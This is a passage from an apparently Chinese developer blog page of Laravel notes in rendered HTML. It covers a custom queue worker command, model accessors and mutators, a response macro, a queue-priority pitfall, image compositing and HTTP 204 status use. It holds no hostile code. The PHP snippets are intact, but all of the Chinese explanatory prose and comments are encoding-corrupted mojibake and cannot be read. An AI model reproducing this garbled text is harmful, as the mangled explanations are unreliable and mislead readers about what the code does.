class="line">æ–°å»ºç›‘å¬é˜Ÿåˆ—å‘½ä»¤ï¼ŒåŒ…è£…ä¸€å±‚ quque:workï¼Œä»¥ä½¿ç”¨è‡ªå®šä¹‰é˜Ÿåˆ—å</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Console\Commands;</span><br><span class="line"></span><br><span class="line">use Illuminate\Console\Command;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueueWorkListen</span> <span class="keyword">extends</span> <span class="title">Command</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name and signature of the console command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $signature = <span class="string">'queue:work-listen</span></span><br><span class="line"><span class="string">                            &#123;connection? : The name of the queue connection to work&#125;</span></span><br><span class="line"><span class="string">                            &#123;--queue= : The names of the queues to work&#125;</span></span><br><span class="line"><span class="string">                            &#123;--daemon : Run the worker in daemon mode (Deprecated)&#125;</span></span><br><span class="line"><span class="string">                            &#123;--once : Only process the next job on the queue&#125;</span></span><br><span class="line"><span class="string">                            &#123;--delay=0 : The number of seconds to delay failed jobs&#125;</span></span><br><span class="line"><span class="string">                            &#123;--force : Force the worker to run even in maintenance mode&#125;</span></span><br><span class="line"><span class="string">                            &#123;--memory=128 : The memory limit in megabytes&#125;</span></span><br><span class="line"><span class="string">                            &#123;--sleep=3 : Number of seconds to sleep when no job is available&#125;</span></span><br><span class="line"><span class="string">                            &#123;--timeout=60 : The number of seconds a child process can run&#125;</span></span><br><span class="line"><span class="string">                            &#123;--tries=0 : Number of times to attempt a job before logging it failed&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The console command description.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $description = <span class="string">'Start processing jobs on the queue as a daemon'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new command instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute the console command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;call(<span class="string">'queue:work'</span>,[</span><br><span class="line">            <span class="string">'connection'</span>=&gt; $<span class="keyword">this</span>-&gt;argument(<span class="string">'connection'</span>),</span><br><span class="line">            <span class="string">'--queue'</span>   =&gt; queue_name($<span class="keyword">this</span>-&gt;option(<span class="string">'queue'</span>) ?: <span class="string">'default'</span>),</span><br><span class="line">            <span class="string">'--daemon'</span>  =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'daemon'</span>),</span><br><span class="line">            <span class="string">'--once'</span>    =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'once'</span>),</span><br><span class="line">            <span class="string">'--delay'</span>   =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'delay'</span>),</span><br><span class="line">            <span class="string">'--force'</span>   =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'force'</span>),</span><br><span class="line">            <span class="string">'--memory'</span>  =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'memory'</span>),</span><br><span class="line">            <span class="string">'--sleep'</span>   =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'sleep'</span>),</span><br><span class="line">            <span class="string">'--timeout'</span> =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'timeout'</span>),</span><br><span class="line">            <span class="string">'--tries'</span>   =&gt; $<span class="keyword">this</span>-&gt;option(<span class="string">'tries'</span>),</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">5</span>ã€ä½¿ç”¨è‡ªå®šä¹‰å‘½ä»¤ç›‘å¬é˜Ÿåˆ—ï¼Œå…¶ä»–å‚æ•°ä¸ queue:work ä¸€æ ·ä½¿ç”¨https:<span class="comment">//learnku.com/articles/19460</span></span><br><span class="line"></span><br><span class="line">php /<span class="keyword">var</span>/www/ebank/artisan queue:work-listen --queue=email --sleep=<span class="number">3</span></span><br><span class="line"><span class="comment">// or å¤šä¸ª</span></span><br><span class="line">php /<span class="keyword">var</span>/www/ebank/artisan queue:work-listen --queue=email,test,test2,test3 --sleep=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">redisé…ç½®ä¸åŒåº“å°±å¯ä»¥</span><br></pre></td></tr></table></figure>
<h3 id="ä¿®æ”¹å™¨"><a href="#ä¿®æ”¹å™¨" class="headerlink" title="ä¿®æ”¹å™¨"></a>ä¿®æ”¹å™¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace App\Models;</span><br><span class="line"></span><br><span class="line">use Illuminate\Database\Eloquent\Model;</span><br><span class="line">use Carbon\Carbon;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Baby</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $table = <span class="string">'baby'</span>;</span><br><span class="line">    protected $appends = [<span class="string">'age'</span>];</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getAgeAttribute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $date = <span class="keyword">new</span> Carbon($<span class="keyword">this</span>-&gt;birthday);</span><br><span class="line">        <span class="keyword">return</span> Carbon::now()-&gt;diffInYears($date);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">è¿™ä¸ªä»£ç æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯é€šè¿‡å·²æœ‰å±æ€§ birthdayï¼Œè®¡ç®— Baby å‡ å²äº†ï¼Œå¾—åˆ° age å±æ€§ã€‚</span><br><span class="line"></span><br><span class="line">å‰ç«¯å°±å¯ä»¥ç›´æ¥æ‹¿åˆ°ç»“æœï¼šhttps:<span class="comment">//learnku.com/articles/21982#topnav</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $baby-&gt;age;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ›´æ”¹ä¸ºæ—¥æœŸç±»å‹çš„å±æ€§</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $dates = [</span><br><span class="line">        <span class="string">'created_at'</span>, </span><br><span class="line">        <span class="string">'updated_at'</span>, </span><br><span class="line">        <span class="string">'expires_at'</span>, </span><br><span class="line">        <span class="string">'gets_mad_at'</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æˆ‘ä»¬æ£€ç´¢æ—¶å§‹ç»ˆå°†åå­—å¤§å†™</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getFirstNameAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ucfirst($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æˆ‘ä»¬æ£€ç´¢æ—¶å§‹ç»ˆå°†å§“æ°å¤§å†™</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getLastNameAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ucfirst($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * å°†åç§°ä¿å­˜åˆ°æ•°æ®åº“æ—¶ï¼Œå§‹ç»ˆå°†åå­—å¤§å†™</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">setFirstNameAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;attributes[<span class="string">'first_name'</span>] = ucfirst($value);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * å°†åç§°ä¿å­˜åˆ°æ•°æ®åº“æ—¶ï¼Œå§‹ç»ˆå°†å§“æ°å¤§å†™</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        public <span class="function"><span class="keyword">function</span> <span class="title">setLastNameAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;attributes[<span class="string">'last_name'</span>] = ucfirst($value);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * æˆ‘ä»¬å°†å¯†ç ä¿å­˜è‡³æ•°æ®åº“æ—¶ï¼Œæ€»æ˜¯å“ˆå¸Œåä¿å­˜ã€‚</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            public <span class="function"><span class="keyword">function</span> <span class="title">setPasswordAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;attributes[<span class="string">'password'</span>] = Hash::make($value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * æ€»æ˜¯ json_decode settingså­—æ®µï¼Œæ‰€ä»¥å®ƒä»¬æ˜¯å¯ç”¨çš„</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                public <span class="function"><span class="keyword">function</span> <span class="title">getSettingsAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> json_decode($value);</span><br><span class="line">            </span><br><span class="line">                    <span class="comment">// ä½ å¯ä»¥ç¡®ä¿åŒæ—¶è¿”å›ä¸€ä¸ªæ•°ç»„</span></span><br><span class="line">                    <span class="comment">// return json_decode($value, true);</span></span><br><span class="line">                &#125;</span><br><span class="line">            </span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                * ä¿å­˜åˆ°æ•°æ®åº“æ—¶ï¼Œæ€»æ˜¯å¯¹ settings å­—æ®µè¿›è¡Œ json_encode</span></span><br><span class="line"><span class="comment">                 * Always json_encode the settings when saving to the database</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                public <span class="function"><span class="keyword">function</span> <span class="title">setSettingsAttribute</span>(<span class="params">$value</span>) </span>&#123;</span><br><span class="line">                    $<span class="keyword">this</span>-&gt;attributes[<span class="string">'settings'</span>] = json_encode($value);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è·å– awesomedudette ç”¨æˆ·  https://learnku.com/laravel/t/27551</span></span><br><span class="line">$user = App\User::where(<span class="string">'username'</span>, <span class="string">'awesomedudette'</span>)-&gt;first();</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŸ¥æ‰¾æ­¤ç”¨æˆ·çš„è¿‡æœŸæ—¶é—´å‰ä¸€å°æ—¶</span></span><br><span class="line">$explodeWarning = $user-&gt;explodes_at-&gt;subHour();</span><br><span class="line">$user = App\User::create([</span><br><span class="line">    <span class="string">'first_name'</span>  =&gt; <span class="string">'chris'</span>,</span><br><span class="line">    <span class="string">'last_name'</span>   =&gt; <span class="string">'sevilleja'</span>,</span><br><span class="line">    <span class="string">'email'</span>       =&gt; <span class="string">'chris&amp;64;scotch.io'</span>,</span><br><span class="line">    <span class="string">'password'</span>    =&gt; <span class="string">'password'</span>,</span><br><span class="line">    <span class="string">'expires_at'</span>  =&gt; Carbon::now()-&gt;addMonth(),</span><br><span class="line">    <span class="string">'explodes_at'</span> =&gt; Carbon::now()-&gt;addDay(),</span><br><span class="line">    <span class="string">'gets_mad_at'</span> =&gt; Carbon::yesterday()</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
<h3 id="å“åº”å®åŸç†"><a href="#å“åº”å®åŸç†" class="headerlink" title="å“åº”å®åŸç†"></a>å“åº”å®åŸç†</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Response::macro(<span class="string">'success'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$data = [], $message = <span class="string">'success'</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> JsonResponse([</span><br><span class="line">        <span class="string">'code'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">'data'</span> =&gt; $data,</span><br><span class="line">        <span class="string">'message'</span> =&gt; $message</span><br><span class="line">    ], <span class="number">200</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">æ¥ä¸‹æ¥ï¼Œ ä½ å¯ä»¥å†ä»»ä½•åœ°æ–¹ä½¿ç”¨å®ƒresponse()ã€‚https:<span class="comment">//godruoyi.com/posts/laravel-response-macro-principle</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//UserController.php</span></span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">users</span>(<span class="params">UserRepository $userRepository</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> response()-&gt;success($userRepository-&gt;all(), <span class="string">'success'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">æ³¨æ„ï¼Œä½ åªèƒ½é€šè¿‡response()è¿™ä¸ªå…¨å±€æ–¹æ³•æˆ–æ˜¯app(<span class="string">'Illuminate\Routing\ResponseFactory'</span>)æ¥ä½¿ç”¨å®ƒ</span><br><span class="line"></span><br><span class="line">response()-&gt;success();<span class="comment">//OK</span></span><br><span class="line">app(<span class="string">'Illuminate\Routing\ResponseFactory'</span>)-&gt;success();<span class="comment">//OK</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Response Facade</span></span><br><span class="line">Response::success();<span class="comment">//ok</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> \Illuminate\Http\Response)-&gt;success();<span class="comment">//Error</span></span><br><span class="line">æ¯ä¸€æ¬¡è¯·æ±‚ç»“æŸï¼ŒPHP çš„å˜é‡éƒ½ä¼š unsetï¼ŒLaravel çš„ singleton åªæ˜¯åœ¨æŸä¸€æ¬¡è¯·æ±‚è¿‡ç¨‹ä¸­çš„singletonï¼›ä½ åœ¨ Laravel ä¸­çš„é™æ€å˜é‡ä¹Ÿä¸èƒ½åœ¨å¤šä¸ªè¯·æ±‚ä¹‹é—´å…±äº«ï¼Œå› ä¸ºæ¯ä¸€æ¬¡è¯·æ±‚ç»“æŸéƒ½ä¼š unsetã€‚ç†è§£è¿™äº›æ¦‚å¿µï¼Œæ˜¯å†™é«˜è´¨é‡ä»£ç çš„ç¬¬ä¸€æ­¥ï¼Œä¹Ÿæ˜¯æœ€å…³é”®çš„ä¸€æ­¥ã€‚å› æ­¤è®°ä½ï¼ŒPHPæ˜¯ä¸€ç§è„šæœ¬è¯­è¨€ï¼Œæ‰€æœ‰çš„å˜é‡åªä¼šåœ¨è¿™ä¸€æ¬¡è¯·æ±‚ä¸­ç”Ÿæ•ˆï¼Œä¸‹æ¬¡è¯·æ±‚ä¹‹æ—¶å·²è¢«é‡ç½®ï¼Œè€Œä¸åƒJavaé™æ€å˜é‡æ‹¥æœ‰å…¨å±€ä½œç”¨ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="é˜Ÿåˆ—ä¼˜å…ˆçº§çš„ä¸€ä¸ªå‘"><a href="#é˜Ÿåˆ—ä¼˜å…ˆçº§çš„ä¸€ä¸ªå‘" class="headerlink" title="é˜Ÿåˆ—ä¼˜å…ˆçº§çš„ä¸€ä¸ªå‘"></a>é˜Ÿåˆ—ä¼˜å…ˆçº§çš„ä¸€ä¸ªå‘</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">php artisan queue:work --queue=high,low</span><br><span class="line">è¿™æ ·ï¼Œå½“æˆ‘ä»¬çš„ä»»åŠ¡éœ€è¦ä¼˜å…ˆå‘é€æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡æŒ‡å®šé˜Ÿåˆ—åhighæ¥ä¼˜å…ˆå‘é€ã€‚</span><br><span class="line"></span><br><span class="line">dispatch((<span class="keyword">new</span> Job)-&gt;onQueue(<span class="string">'high'</span>));</span><br><span class="line">ä½†æ˜¯å½“ä½ åç»­ä»»åŠ¡æ²¡æœ‰æŒ‡å®šé˜Ÿåˆ—åï¼ˆhighã€lowï¼‰æ—¶ï¼Œä½ çš„é˜Ÿåˆ—ä»»åŠ¡æ°¸è¿œä¹Ÿä¸ä¼šæ‰§è¡Œã€‚ï¼ˆæ¯”å¦‚æˆ‘ä»¬åœ¨å‘é€æ¶ˆæ¯é€šçŸ¥æ—¶ï¼‰</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Notifications;</span><br><span class="line"></span><br><span class="line">use Illuminate\Bus\Queueable;</span><br><span class="line">use Illuminate\Notifications\Notification;</span><br><span class="line">use Illuminate\Contracts\Queue\ShouldQueue;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">YourNotification</span> <span class="keyword">extends</span> <span class="title">Notification</span> <span class="title">implements</span> <span class="title">ShouldQueue</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    use Queueable;</span><br><span class="line">&#125;</span><br><span class="line">ä½ å‘ç°å³ä½¿ä½ æŒ‰ç…§æ–‡æ¡£è¯´çš„ï¼Œimplements ShouldQueueå¹¶ä¸”use Queueableï¼Œè¯¥é€šçŸ¥è¿˜æ˜¯æ— æ³•åŠ å…¥é˜Ÿåˆ—ã€‚</span><br><span class="line"></span><br><span class="line">é‚£æ˜¯å› ä¸ºconfig\queuq.phpé…ç½®ä¸­ï¼ŒæŒ‡å®šäº†é»˜è®¤çš„é˜Ÿåˆ—åä¸º<span class="keyword">default</span>ï¼Œæ‰€ä»¥æ‰€æœ‰çš„é˜Ÿåˆ—ä»»åŠ¡ï¼Œå¦‚æœæ²¡æŒ‡å®šé˜Ÿåˆ—åæ—¶ï¼Œé»˜è®¤æ˜¯<span class="keyword">default</span>ã€‚</span><br><span class="line"></span><br><span class="line">ä½†æ˜¯æˆ‘ä»¬åœ¨å¯åŠ¨é˜Ÿåˆ—è¿›ç¨‹æ—¶ï¼ŒåªæŒ‡å®šäº†highå’Œlowã€‚å½“ç„¶ä¸ä¼šç”Ÿæ•ˆã€‚https:<span class="comment">//godruoyi.com/posts/a-pit-in-the-laravel-queue-priority</span></span><br><span class="line"></span><br><span class="line">è§£å†³åŠæ³•ï¼š <span class="number">1</span>ã€ä¿®æ”¹config\queuq.phpé»˜è®¤é˜Ÿåˆ—åä¸ºlowæˆ–high <span class="number">2</span>ã€å¯åŠ¨é˜Ÿåˆ—è¿›ç¨‹æ—¶æ·»åŠ <span class="keyword">default</span>ï¼ˆ--queue=high,<span class="keyword">default</span>,lowï¼‰</span><br></pre></td></tr></table></figure>
<h3 id="åˆæˆå›¾ç‰‡"><a href="#åˆæˆå›¾ç‰‡" class="headerlink" title="åˆæˆå›¾ç‰‡"></a>åˆæˆå›¾ç‰‡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">use Intervention\Image\ImageManager;</span><br><span class="line"></span><br><span class="line">$manager = <span class="keyword">new</span> ImageManager(array(<span class="string">'driver'</span> =&gt; <span class="string">'imagick'</span>));</span><br><span class="line">å¦‚æœæ˜¯åœ¨ Laravel ä¸­ï¼Œå¯ç›´æ¥é€šè¿‡ app(<span class="string">'image'</span>) æˆ–ä½¿ç”¨ Intervention\Image\Facades\Image é—¨é¢ç±»ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use Intervention\Image\Facades\Image;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æˆ–</span></span><br><span class="line">$manager = app(<span class="string">'image'</span>);</span><br><span class="line">åˆæˆ</span><br><span class="line"></span><br><span class="line"><span class="comment">// $image = $manager-&gt;make($bg);</span></span><br><span class="line"><span class="comment">// $image = Image::make($bg);</span></span><br><span class="line"></span><br><span class="line">$image = app(<span class="string">'image'</span>)-&gt;make($bg);</span><br><span class="line"></span><br><span class="line"><span class="comment">// äºŒç»´ç å›¾ç‰‡https://godruoyi.com/posts/intervention-image-was-used-to-synthesize-images</span></span><br><span class="line">$qrcodeImage = app(<span class="string">'image'</span>)-&gt;make($qrcodeurl)-&gt;resize(<span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line"><span class="comment">// é‡ç½® å¤´åƒ å¤§å°</span></span><br><span class="line">$avatarImage  = app(<span class="string">'image'</span>)-&gt;make($httpClient-&gt;request(<span class="string">'GET'</span>, $avatarurl)-&gt;getBody())-&gt;resize(<span class="number">200</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">$image-&gt;text(<span class="string">'Nickname'</span>, <span class="number">376</span>, <span class="number">320</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$font</span>) </span>&#123;</span><br><span class="line">    $font-&gt;file(public_path(<span class="string">'fonts/SimHei.ttf'</span>));</span><br><span class="line">    $font-&gt;size(<span class="number">40</span>);</span><br><span class="line">    $font-&gt;color(<span class="string">'#000000'</span>);</span><br><span class="line">    $font-&gt;align(<span class="string">'center'</span>);</span><br><span class="line">    $font-&gt;valign(<span class="string">'top'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$image-&gt;insert($qrcodeImage, <span class="string">'bottom'</span>, <span class="number">0</span>, <span class="number">360</span>);</span><br><span class="line">$image-&gt;insert($avatarImage, <span class="string">'top'</span>, <span class="number">0</span>, <span class="number">105</span>);</span><br></pre></td></tr></table></figure>
<h3 id="http-code-204"><a href="#http-code-204" class="headerlink" title="http code 204"></a>http code 204</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">204</span> ä¸ºæˆåŠŸçŠ¶æ€å“åº”ç ï¼Œè¡¨ç¤ºç›®å‰è¯·æ±‚æˆåŠŸï¼Œä½†å®¢æˆ·ç«¯ä¸éœ€è¦æ›´æ–°å…¶ç°æœ‰é¡µé¢ã€‚<span class="number">204</span> å“åº”é»˜è®¤æ˜¯å¯ä»¥è¢«ç¼“å­˜çš„ã€‚åœ¨å“åº”ä¸­éœ€è¦åŒ…å«å¤´ä¿¡æ¯ ETagã€‚</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨æƒ¯ä¾‹æ˜¯ï¼Œåœ¨ PUT è¯·æ±‚ä¸­è¿›è¡Œèµ„æºæ›´æ–°ï¼Œä½†æ˜¯ä¸éœ€è¦æ”¹å˜å½“å‰å±•ç¤ºç»™ç”¨æˆ·çš„é¡µé¢ï¼Œé‚£ä¹ˆè¿”å› <span class="number">204</span> No Contentã€‚å¦‚æœæ–°åˆ›å»ºäº†èµ„æºï¼Œé‚£ä¹ˆè¿”å› <span class="number">201</span> Created ã€‚å¦‚æœé¡µé¢éœ€è¦æ›´æ–°ä»¥åæ˜ æ›´æ–°åçš„èµ„æºï¼Œé‚£ä¹ˆéœ€è¦è¿”å› <span class="number">200</span> ã€‚</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥å¤§å®¶åœ¨åš RestFul API æ¥å£æ˜¯ï¼Œstoreã€update ä»€ä¹ˆçš„ï¼Œåˆ«å…¨ <span class="number">200</span> <span class="number">200</span> çš„è¿”å›äº†ï¼Œä¸æ­£è§„ã€‚https:<span class="comment">//learnku.com/articles/28056</span></span><br></pre></td></tr></table></figure>
